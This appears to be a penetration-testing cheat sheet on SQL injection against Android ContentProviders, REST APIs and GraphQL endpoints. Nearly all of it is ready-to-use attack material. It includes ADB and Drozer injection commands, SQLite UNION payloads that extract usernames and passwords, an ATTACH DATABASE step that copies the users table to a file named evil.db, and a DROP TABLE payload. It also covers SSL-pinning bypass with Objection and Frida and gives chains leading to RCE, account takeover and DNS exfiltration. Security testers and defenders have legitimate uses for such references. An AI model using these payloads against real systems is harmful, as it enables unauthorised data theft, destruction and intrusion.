# Android & API SQL Injection Reference

## ANDROID SQLi

### Common Vulnerable Patterns in APK Source

```java
// ❌ VULNERABLE — raw query with user input:
Cursor c = db.rawQuery("SELECT * FROM users WHERE id=" + userId, null);
db.execSQL("DELETE FROM records WHERE name='" + name + "'");
String query = "SELECT * FROM items WHERE category=" + getIntent().getStringExtra("cat");
db.rawQuery("SELECT * FROM notes WHERE title LIKE '%" + searchTerm + "%'", null);

// ✅ SAFE — parameterized:
Cursor c = db.rawQuery("SELECT * FROM users WHERE id=?", new String[]{userId});
```

### Static Analysis (Finding Vulnerable Code)

```bash
# 1. Decompile APK:
jadx -d output/ target.apk

# 2. Grep for vulnerable patterns:
grep -r "rawQuery\|execSQL\|query(" output/ --include="*.java" | grep -v "=?"

# 3. Find SQLite database names:
grep -r "openDatabase\|SQLiteOpenHelper\|getWritableDatabase" output/ --include="*.java"

# 4. Find ContentProvider URIs:
grep -r "content://" output/ --include="*.java"
grep -r "addURI\|UriMatcher" output/ --include="*.java"

# 5. Exported ContentProviders (AndroidManifest.xml):
grep -A3 'ContentProvider' output/resources/AndroidManifest.xml | grep 'exported.*true'
```

### ContentProvider Testing (ADB)

```bash
# List all ContentProviders:
adb shell dumpsys package | grep -i provider

# Query a provider:
adb shell content query --uri content://com.target.app.provider/users

# Inject in last path segment:
adb shell content query --uri "content://com.target.app.provider/users/1 OR 1=1"
adb shell content query --uri "content://com.target.app.provider/items/1' UNION SELECT name,sql,null FROM sqlite_master--"

# Inject in where clause (if app allows WHERE):
adb shell content query \
  --uri content://com.target.app.provider/users \
  --where "id=1 OR 1=1"

# Inject in selection argument:
adb shell content query \
  --uri content://com.target.app.provider/data \
  --where "name=?" \
  --arg "' OR '1'='1"

# Test with Drozer:
run app.provider.query content://com.target.app.provider/users \
  --projection "* FROM sqlite_master--" \
  --selection "1=1"
```

### SQLite-Specific Payloads

```sql
-- Schema discovery:
' UNION SELECT name,sql,NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0--

-- Column discovery from schema:
' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE name='users'--

-- Data extraction:
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT group_concat(username||':'||password),NULL,NULL FROM users--

-- Version:
' UNION SELECT sqlite_version(),NULL,NULL--

-- File-based (if path traversal possible):
ATTACH DATABASE '/sdcard/evil.db' AS evil;
CREATE TABLE evil.hacked(data TEXT);
INSERT INTO evil.hacked SELECT * FROM users;

-- Time-based (no SLEEP in SQLite — use heavy recursion):
' AND (WITH RECURSIVE r(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM r LIMIT 1000000) SELECT COUNT(*) FROM r)=1000000--
```

### Android Network Traffic Interception

```bash
# Set up Burp proxy for Android:
# 1. Install Burp cert on device
# 2. Set proxy in WiFi settings
# 3. For cert-pinned apps — use Frida or Objection:

# Bypass cert pinning with Objection:
objection --gadget "com.target.app" explore
# Then: android sslpinning disable

# Frida script for bypass:
frida -U -l ssl_bypass.js -f com.target.app
```

---

## REST API SQLi

### Surface Map

```
GET  /api/users?id=1
GET  /api/search?q=test&sort=name
GET  /api/products?category=electronics&page=1
POST /api/login  {"username":"...","password":"..."}
POST /api/filter {"conditions":{"id":1}}
PUT  /api/users/1 {"name":"..."}
GET  /api/v2/items/1
GET  /api/reports?from=2024-01-01&to=2024-12-31
GET  /api/export?format=csv&filter=id>0
```

### API-Specific Injection Points

```bash
# Path parameter:
GET /api/users/1 UNION SELECT null,username,password FROM users--

# Sort/order parameter (common ORM injection):
GET /api/products?sort=name; DROP TABLE products--
GET /api/products?orderBy=(SELECT 1 FROM(SELECT SLEEP(3))x)--
GET /api/items?sort=price,(SELECT 1 FROM(SELECT SLEEP(3))a)

# Date range parameters:
GET /api/logs?from=2024-01-01' AND SLEEP(3)--

# JSON body injection:
POST /api/search
{"query": "test' UNION SELECT null,username,password FROM users--"}
{"filter": {"name": "test' OR '1'='1"}}
{"id": "1 UNION SELECT null,table_name FROM information_schema.tables--"}

# Header injection:
X-User-ID: 1 UNION SELECT null,password FROM users WHERE username='admin'--
X-API-Version: 1' AND SLEEP(3)--
Authorization: Bearer ' AND 1=SLEEP(3)--  (if JWT is parsed and queried)
```

### Testing API SQLi Systematically

```bash
# Use Burp Suite:
# 1. Proxy API traffic
# 2. Send to Intruder
# 3. Mark injectable value
# 4. Use SQLi probe payload list
# 5. Grep for SQL errors OR compare response lengths

# ffuf for fast API param fuzzing:
ffuf -u "https://api.target.com/v1/users/FUZZ" \
  -w sqli_probes.txt \
  -t 10 \
  -fc 404

# Nuclei SQLi templates:
nuclei -u https://api.target.com -t sqli/ -severity critical,high
```

---

## GRAPHQL SQLi

### Schema Introspection First

```graphql
# Map the schema:
{
  __schema {
    types {
      name
      fields {
        name
        args { name type { name } }
      }
    }
  }
}

# Find queryable fields with arguments (injection candidates):
{ __schema { queryType { fields { name args { name } } } } }
```

### GraphQL Injection Payloads

```graphql
# Inject in argument string values:
{ user(id: "1 UNION SELECT username,password FROM users--") { id name } }
{ product(name: "test' OR '1'='1") { id price } }
{ search(query: "'; SELECT SLEEP(3)--") { results } }

# Integer parameter injection:
{ user(id: "1 OR 1=1") { id } }
{ items(categoryId: "1 UNION SELECT null,table_name FROM information_schema.tables--") { id } }

# Nested object injection:
{ users(filter: {name: "admin'--"}) { id name email } }
{ orders(where: {status: "pending' OR '1'='1"}) { id } }

# Batch query abuse:
[
  {"query": "{ user(id: \"1\") { name } }"},
  {"query": "{ user(id: \"1 UNION SELECT null,password FROM users--\") { name } }"}
]
```

### GraphQL-Specific Bypasses

```graphql
# Alias injection to bypass field restrictions:
{
  legit: user(id: "1") { id }
  injected: user(id: "1 UNION SELECT username,password FROM users--") { id }
}

# Fragment injection:
fragment UserFields on User { id name }
{ user(id: "1 UNION SELECT username,password FROM users--") { ...UserFields } }

# Variable injection:
query GetUser($id: String) { user(id: $id) { name } }
# Variables: {"id": "1 UNION SELECT null,password FROM users--"}
```

### GraphQL Tooling

```bash
# InQL (Burp extension) for GraphQL schema mapping
# GraphQL Voyager for visual schema exploration

# Direct introspection via curl:
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# Inject via curl:
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: \"1 UNION SELECT null,password FROM users--\") { id } }"}'
```

---

## API SQLI CHAINING EXAMPLES

```
GraphQL SQLi → extract API keys from DB → access admin API → RCE
REST API sort param SQLi → SLEEP confirmed → sqlmap dump → user table → hash crack → ATO
Android ContentProvider SQLi → extract cleartext credentials → login bypass
API JSON body injection → 2nd order → admin action triggered → privilege escalation
OOB SQLi via API param → DNS callback confirms → no output but data exfil via DNS
```
